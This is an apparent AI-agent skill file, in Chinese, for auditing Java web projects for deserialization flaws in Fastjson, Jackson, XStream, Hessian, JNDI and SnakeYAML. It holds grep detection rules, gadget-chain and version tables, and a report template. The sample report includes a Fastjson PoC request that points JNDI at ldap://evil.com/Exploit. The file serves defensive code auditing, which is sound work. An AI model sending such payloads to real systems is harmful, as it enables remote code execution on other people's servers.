---
name: java-deserialization-audit
description: Java Web 源码反序列化漏洞审计工具。覆盖 Java 原生反序列化、Fastjson/Jackson/XStream/Hessian/JNDI/SnakeYAML 等反序列化入口检测，结合 classpath gadget 链分析进行利用链评估。适用于：(1) 识别反序列化入口点，(2) 检测 classpath 中已知 gadget 链，(3) 结合鉴权状态评估可利用性，(4) 审计 JNDI 注入风险。**支持反编译 .class/.jar 文件**。
---

# Java 反序列化漏洞审计工具

扫描 Java Web 项目源码，识别所有反序列化入口，检测可用的 gadget 链，评估利用可行性。

---

## 漏洞分级标准

详见 [SEVERITY_RATING.md](../java-shared/SEVERITY_RATING.md)

- 漏洞编号格式: `{C/H/M/L}-DESERIALIZE-{序号}`
- 反序列化入口 + 无鉴权 + classpath 含已知 gadget → 直接标记 Critical
- Score = R × 0.40 + I × 0.35 + C × 0.25

---

## 检测范围

> 完整入口点详解（Java 原生/Fastjson/Jackson/XStream/Hessian/SnakeYAML/RMI/LDAP）见 [DESERIALIZATION_ENTRIES.md](references/DESERIALIZATION_ENTRIES.md)

| 反序列化类型 | 识别特征 | 危险等级 |
|:------------|:---------|:---------|
| Java 原生反序列化 | `ObjectInputStream.readObject()`, `ObjectInputStream.readUnshared()` | 🔴 Critical |
| Fastjson | `JSON.parseObject()`, `JSON.parse()` + autoType 开启 | 🔴 Critical |
| Jackson | `ObjectMapper.enableDefaultTyping()`, `@JsonTypeInfo` 注解 | 🟡 High |
| XStream | `XStream.fromXML()`, `new XStream()` 无安全框架 | 🟡 High |
| Hessian | `HessianInput.readObject()`, `Hessian2Input.readObject()` | 🔴 Critical |
| JNDI 注入 | `InitialContext.lookup()`, `InitialDirContext.lookup()` | 🔴 Critical |
| SnakeYAML | `Yaml.load()` (非 loadAs), `Constructor()` 自定义 | 🟡 High |
| RMI | `Naming.lookup()`, `Registry.lookup()` 远程 RMI | 🟡 High |
| LDAP | `new InitialDirContext(env)` + 用户可控 LDAP URL | 🟡 High |

---

## 工作流程

### 1. 项目扫描初始化

```bash
# 步骤1: 识别反序列化依赖
find {source_path} -name "*.jar" | grep -iE "fastjson|jackson|xstream|hessian|snakeyaml|yaml|commons-collections|commons-beanutils|spring|groovy|aspectj"

# 步骤2: 扫描 pom.xml 反序列化相关依赖
grep -rE "fastjson|jackson|xstream|hessian|snakeyaml" {source_path}/pom.xml 2>/dev/null

# 步骤3: 扫描 deserialize 入口点
grep -rnE "readObject|readUnshared|readResolve|readExternal" {source_path} --include="*.java" --include="*.class"
```

### 2. 反序列化入口点检测

#### 2.1 Java 原生反序列化

**检测规则：**

```bash
# 寻找 ObjectInputStream.readObject 调用
grep -rnE "readObject\(\)|readUnshared\(\)" --include="*.java"

# 寻找 ObjectInputStream 构造（网络输入 / 文件输入 / HTTP Body）
grep -rnE "new ObjectInputStream\(" --include="*.java" | grep -v "System.in"

# 寻找 Base64 解码 + ObjectInputStream（常见绕过 WAF 模式）
grep -rnE "Base64.*decode.*ObjectInputStream|ObjectInputStream.*Base64" --include="*.java"
```

**关键判定：**
- ObjectInputStream 的构造函数参数来源是否为 `request.getInputStream()` → ✅ 可由 HTTP 触发
- 是否经过过滤（`ValidatingObjectInputStream`、`LookAheadObjectInputStream`）→ 如有则降级
- classpath 是否存在 ysoserial gadget 链 → 见 2.2 节

#### 2.2 Fastjson 反序列化

**检测规则：**

```bash
# 寻找 parseObject / parse 调用
grep -rnE "JSON\.parseObject\(|JSON\.parse\(|JSONObject\.parseObject\(|JSONArray\.parseArray\(" --include="*.java"

# 检查 autoType 是否开启
grep -rnE "ParserConfig.*AutoTypeSupport|autoTypeSupport.*true" --include="*.java"
grep -rnE "autoTypeEnable|setAutoTypeSupport" --include="*.java"
```

**Fastjson 版本与利用条件速查：**

| 版本 | 利用方式 | 条件 |
|:-----|:---------|:-----|
| ≤ 1.2.24 | 直接 autoType RCE | 无限制 |
| ≤ 1.2.47 | autoType 绕过 | 需开启 autoType 或有特定 class |
| ≤ 1.2.68 | expectClass 绕过 | 需 `@type` 可控 |
| ≤ 2.0.x | 新 autoType 绕过 | 需特定 JDK 版本 |

#### 2.3 Jackson 反序列化

**检测规则：**

```bash
# enableDefaultTyping 开启检测
grep -rnE "enableDefaultTyping|ENABLE_DEFAULT_TYPING|DefaultTyping" --include="*.java"

# @JsonTypeInfo 注解使用
grep -rnE "@JsonTypeInfo\(|@JsonSubTypes\(" --include="*.java"

# polymorphic 反序列化（readValue 含泛型 Object.class）
grep -rnE "readValue\(.*Object\.class|readValue\(.*Serializable" --include="*.java"
```

#### 2.4 XStream 反序列化

**检测规则：**

```bash
# XStream 实例化 - 检查是否设置安全框架
grep -rnE "new XStream\(\)|XStream.*fromXML" --include="*.java"
grep -rnE "setClassLoader|addPermission|allowTypes|denyTypes|XStream\.setupDefaultSecurity" --include="*.java"

# 版本检测
find . -name "xstream-*.jar" -o -name "xstream-*-*.jar"
```

**XStream 历史 CVE 速查：**

| CVE | 影响版本 | CVSS |
|:----|:---------|:-----|
| CVE-2021-39144 | ≤ 1.4.17 | 9.8 |
| CVE-2021-29505 | ≤ 1.4.16 | 9.8 |
| CVE-2021-21351 | ≤ 1.4.15 | 9.1 |
| CVE-2020-26217 | ≤ 1.4.13 | 9.8 |

#### 2.5 Hessian 反序列化

**检测规则：**

```bash
# Hessian 输入
grep -rnE "HessianInput|Hessian2Input|SerializerFactory" --include="*.java"
grep -rnE "HessianServlet|HessianServiceExporter|HessianProxyFactory" --include="*.java"

# Dubbo 中 Hessian2 使用
grep -rnE "DubboProtocol|hessian2" --include="*.java"
grep -rnE "SerializationOptimizer|Hessian2Serialization" --include="*.java"
```

#### 2.6 JNDI 注入

> 完整 JNDI 注入详解（JDK 版本限制矩阵 + Log4Shell + Spring Cloud Gateway + marshalsec 利用）见 [JNDI_INJECTION.md](references/JNDI_INJECTION.md)

**检测规则：**

```bash
# JNDI lookup 调用 - 最高优先级
grep -rnE "\.lookup\(|InitialDirContext" --include="*.java"

# 判断 lookup 参数来源是否为用户可控
# 需要配合 route-tracer 做数据流追踪

# Log4j JNDI 特征（即使已打补丁也要标记）
grep -rnE "JndiLookup|JndiManager|log4j.*jndi" --include="*.java"
```

**JNDI 注入利用条件：**

| JDK 版本 | `ldap://` | `rmi://` | 条件 |
|:---------|:----------|:---------|:-----|
| ≤ 8u113 | ✅ | ✅ | 无限制 |
| 8u113-8u191 | ✅ | ✅ | `trustURLCodebase=true` |
| ≥ 8u191 | ❌ | ❌ | 需本地 gadget 链 (deserialize + JNDI) |

#### 2.7 SnakeYAML 注入

**检测规则：**

```bash
# Yaml.load — 危险！不要用 loadAs 过滤
grep -rnE "Yaml\(\)\.load\(|new Yaml\(\)" --include="*.java" | grep -v "loadAs"

# Spring Boot yaml 配置注入
grep -rnE "spring\.yaml\.|YamlPropertiesFactoryBean" --include="*.java"
```

---

### 3. Classpath Gadget 链分析（CRITICAL）

**这是决定反序列化漏洞能否 RCE 的关键步骤。**

> 完整 Gadget 链矩阵（24 条 ysoserial 链 + Fastjson/Jackson/Hessian/XStream 专用链）见 [GADGET_CHAINS.md](references/GADGET_CHAINS.md)

```bash
# 扫描 WEB-INF/lib 中是否存在已知 gadget 库
find {source_path} -name "*.jar" | grep -iE "commons-collections|commons-beanutils|commons-logging|spring-|groovy|aspectj|jython|rome|click-nodeps|vaadin|c3p0|hessian|jboss|wicket|mojarra|myfaces"
```

**Gadget 库与对应的 ysoserial 利用链：**

| Gadget 库 | ysoserial 链名 | JDK 限制 |
|:----------|:---------------|:---------|
| commons-collections 3.x | CommonsCollections1-7 | JDK ≤ 8u71 (CC1) |
| commons-collections 4.x | CommonsCollections2/4/8 | 需 commons-collections4 |
| commons-beanutils 1.9.x | CommonsBeanutils1 | 无 JDK 限制 |
| spring-core + spring-beans | Spring1/2 | 需 spring 版本匹配 |
| groovy 2.x | Groovy1 | JDK ≤ 8u191 |
| fastjson ≥ 1.2.24 | 走 JNDI/JDBC 链 | 见 2.2 节 |
| jackson + 任意 gadget | 走 polymorphic 链 | 需 enableDefaultTyping |

---

### 4. 可利用性综合评估

结合以下维度判定风险等级：

```
可利用性 = f(入口可达性, 鉴权状态, gadget 可用性, JDK 版本)

判定规则：
├── 入口可达 + ❌无鉴权 + classpath 含 gadget → 🔴 Critical 可直接利用
├── 入口可达 + 🔓可绕过鉴权 + classpath 含 gadget → 🔴 Critical 需绕过步骤
├── 入口可达 + ✅有鉴权 + classpath 含 gadget → 🟡 High 需认证后利用
├── 入口可达 + 任何鉴权 + classpath 不含 gadget → 🟢 Low 需自定义 gadget
└── 入口不可达 → 排除
```

---

### 5. 输出模板

```markdown
# Java 反序列化漏洞审计报告

## 📊 扫描概览

| 指标 | 数量 |
|:-----|:-----|
| 反序列化入口点 | X |
| 含 gadget 链入口 | Y |
| 无鉴权 + 含 gadget | Z |
| 可绕过鉴权 + 含 gadget | W |

## 🔴 高危风险详情

### [C-DESERIALIZE-001] Fastjson 反序列化 RCE

- **位置**: `UserController.parse() (UserController.java:45)`
- **反序列化类型**: Fastjson
- **版本**: fastjson 1.2.24 (含已知 RCE gadget)
- **触发方式**: POST `/api/parse` → `@RequestBody String json` → `JSON.parse(json)`
- **鉴权状态**: ❌ 无鉴权
- **利用链**: Fastjson 1.2.24 → JNDI 注入 → RCE
- **PoC**:

```http
POST /api/parse HTTP/1.1
Content-Type: application/json

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
```

- **修复建议**: 升级 Fastjson ≥ 1.2.83 并关闭 autoType

---

### [C-DESERIALIZE-002] Hessian 反序列化 RCE

- **位置**: `RpcController.handle() (RpcController.java:78)`
- **反序列化类型**: Hessian2
- **classpath gadget**: commons-collections 3.2.1 (CC1 链可用)
- **触发方式**: POST `/api/rpc` → Hessian2 反序列化
- **鉴权状态**: ❌ 无鉴权
- **JDK 版本**: 项目使用 JDK 8u66 (CC1 链可用)
- **修复建议**: 升级 commons-collections、添加 Hessian 类型白名单

## 🟡 中危风险详情

...

## 📋 完整入口点清单

| 序号 | 类名 | 方法 | 反序列化类型 | gadget 可用 | 鉴权 | 风险 |
|:-----|:-----|:-----|:-----------|:-----------|:-----|:-----|
| 1 | UserController | parse | Fastjson | ✅ CC1 | ❌ | 🔴 |
| 2 | RpcController | handle | Hessian2 | ✅ CC1 | ❌ | 🔴 |
| ... | ... | ... | ... | ... | ... | ... |
```

---

## 核心要求

- ✅ 识别所有反序列化入口点（7 种类型全覆盖）
- ✅ 检测 classpath 中已知 gadget 库
- ✅ 结合 JDK 版本评估利用链可行性
- ✅ 结合鉴权状态评估实际可利用性
- ✅ 每个可利用漏洞提供 PoC
- ❌ 禁止跳过反编译步骤
- ❌ 禁止省略 gadget 链分析

---

## 反编译阶段（CRITICAL）

**当源码不可用时，必须使用 CFR 反编译器反编译反序列化相关类。**

详细策略参见 [DECOMPILE_STRATEGY.md](references/DECOMPILE_STRATEGY.md)

```bash
# 反编译序列化工具类
java -jar {CFR_JAR} /path/to/SerializeUtils.class --outputdir {output_path}/decompiled

# 批量反编译反序列化入口类和配置类
find /path/to/WEB-INF/classes -name "*Serial*.class" -o -name "*Deserial*.class" -o -name "*Config*.class" | \
  xargs java -jar {CFR_JAR} --outputdir {output_path}/decompiled
```

---

## 输出格式

**严格按照 [references/OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) 中的填充式模板生成输出文件。**

- 文件名格式: `{project_name}_deserialize_audit_{YYYYMMDD_HHMMSS}.md`
- 不得修改模板结构、不得增删章节、不得调整顺序
- 所有【填写】占位符必须替换为实际内容
- 通用规范参考: [java-shared/OUTPUT_STANDARD.md](../java-shared/OUTPUT_STANDARD.md)

---

## 参考资料

| 文档 | 用途 | 何时加载 |
|------|------|---------|
| [DESERIALIZATION_ENTRIES.md](references/DESERIALIZATION_ENTRIES.md) | 8 种反序列化入口详解 + 过滤器检测 + 判定矩阵 | 识别反序列化入口时参考 |
| [GADGET_CHAINS.md](references/GADGET_CHAINS.md) | 24 条 ysoserial 链矩阵 + Fastjson/Jackson/Hessian/XStream 专用链 | 评估 Gadget 可用性时必读 |
| [JNDI_INJECTION.md](references/JNDI_INJECTION.md) | JNDI 注入原理 + JDK 版本限制矩阵 + Log4Shell + Spring 关联 | 检测到 JNDI lookup 时必读 |
| [OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) | 填充式输出报告模板 | 生成最终报告时严格对照 |
| [DECOMPILE_STRATEGY.md](references/DECOMPILE_STRATEGY.md) | 反编译策略 + 反序列化类定位 + Gadget 优先扫描 | 源码不可用时必读 |
